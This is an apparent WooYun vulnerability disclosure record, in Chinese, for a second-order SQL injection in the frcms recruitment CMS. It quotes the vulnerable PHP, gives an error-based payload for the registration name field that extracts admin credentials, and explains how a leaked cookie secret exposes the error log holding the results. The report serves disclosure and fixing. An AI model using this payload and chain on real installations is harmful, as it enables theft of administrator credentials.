{"id": 36911, "wybug_id": "wooyun-2015-0100830", "wybug_title": "嘉缘人才系统最新版sql注入(直接出数据)", "wybug_corp": "finereason.com", "wybug_author": "牛肉包子", "wybug_date": "2015-03-12 11:59", "wybug_open_date": "2015-06-11 10:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-16：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-11：\t细节向公众公开  简要描述： 最新版本20150126 详细说明：  看到frcms\\inc\\attention.php\nrequire(dirname(__FILE__).'/../config.inc.php');if(empty($do)) $do= '';$db=connectdb();$mid=intval($mid);if($do==\"addatten\"&&$mid){    $username=_getcookie('user_login');    if($username==''){        echo 'nologin';exit();    }else{        $rs = $db->get_one(\"select m_id,m_flag,m_name,m_typeid from {$cfg['tb_pre']}member where m_login='$username' limit 1\");        if($rs){            $attentioner=$rs['m_id'];            $rsa = $db->get_one(\"select * from {$cfg['tb_pre']}attention where a_mid='$mid' and a_attentioner='$attentioner' limit 1\");            if($rsa){                echo 'haveadd';exit();            }else{            \t$operation=                $db ->query(\"INSERT INTO {$cfg['tb_pre']}attention (a_mid,a_attentioner,a_attendate) VALUES('$mid','$attentioner',NOW())\");                                     $rsb=$db->get_one(\"select m_name,m_typeid from {$cfg['tb_pre']}member where m_id='$mid'\");                require_once(FR_ROOT.'/inc/paylog.inc.php');                adddynamic($attentioner,$rs['m_name'],$rs['m_typeid'],1,$mid,$rsb['m_name'],$rsb['m_typeid']);            \techo 'succeed';exit();            }        }else{            echo 'nouser';exit();        }    }}elseif($do==\"getatten\"&&$mid){    $attentioner = $db->counter(\"{$cfg['tb_pre']}attention\",\"a_mid='$mid'\");;    $username=_getcookie('user_login');    $username&&$rs = $db->get_one(\"select m_id,m_flag from {$cfg['tb_pre']}member where m_login='$username' limit 1\");    if($rs){        $rsa = $db->get_one(\"select * from {$cfg['tb_pre']}attention where a_mid='$mid' and a_attentioner='$rs[m_id]' limit 1\");        if($rsa){            echo '[关注中]:'.$attentioner;exit();        }    }    echo '[+关注]:'.$attentioner;exit();}\n可以发现$rs['m_name']直接出库，然后进入了adddynamic这个函数，跟进adddynamic函数\nfunction adddynamic($mid,$name,$typeid,$operation,$bid,$bname,$type){    global $cfg,$db;\t$db->query(\"INSERT INTO {$cfg['tb_pre']}dynamic(`d_mid`,`d_name`,`d_typeid`,`d_operation`,`d_bid`,`d_bname`,`d_type`,`d_time`) VALUES('$mid','$name','$typeid','$operation','$bid','$bname','$type',NOW())\");}\n其实就是一个入库操作。很明显这儿有注入。首先注册一个个人用户\n\n其中真实姓名为\n'or char(@`'`) or (SELECT 1 FROM(SELECT count(*),concat((SELECT(SELECT concat(a_user,0x27,a_pass)) FROM job_admin limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) ,0)# or\n然后访问\nhttp://127.0.0.1/frcms/inc/attention.php?do=addatten&mid=2\n\n\n发现mysql报错了，这cms会把错误记录到一个文件里面。如下代码实现\nfunction log_write($message, $type = 'php') {\tglobal $cfg, $fr_time, $username;\t$userip = getip();    $fr_time or $fr_time = time();\t$user = $username ? $username : 'guest';    dir_create(DATA_ROOT.'/log/');    $log_file = DATA_ROOT.'/log/'.$type.'_'.md5($cfg['cookie_encode']).'.txt';\t$log = date('Y-m-d H:i:s', $fr_time).\"||$userip||$user||\".$_SERVER['SCRIPT_NAME'].\"||\".str_replace('&', '&amp;', $_SERVER['QUERY_STRING']).\"||$message\\r\\n\";    $olog=file_get_contents($log_file);    fputs(fopen($log_file,\"w\"), $log.$olog);}\n主要是要获取到$cfg['cookie_encode']这个值，然后就可以找到这个文件了。我们可以看到在最新版cookie是这样设置的。\nfunction _setcookie($var, $value = '', $time = 0) {    global $cfg, $fr_time;\t$time = $time > 0 ? $fr_time+$time : (empty($value) ? $fr_time - 3600 : 0);\t$port = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;\t$var = $cfg['cookie_pre'].$var;$value&&$value=base64_encode($value.$cfg['cookie_encode']);\treturn setcookie($var, $value, $time, $cfg['cookie_path'], $cfg['cookie_domain'], $port);}\n可以看到这儿就泄露了。我们查看登陆的cookie\n\n把base64解密之后就为testSgZQd3305V，其中test为我的用户名。后面的一串为$cfg['cookie_encode'])，获得$cfg['cookie_encode'])之后，我们构造日志文件名。http://127.0.0.1/frcms/data/log/sql_e15a0a25dbd4030a31357433e2a1b26a.txt然后访问可以看到数据已经出来了\n\n   漏洞证明：  \n\n   修复方案：  转义   版权声明：转载请注明来源 牛肉包子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-03-13 10:49 厂商回复： 感谢提交问题，问题即将修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}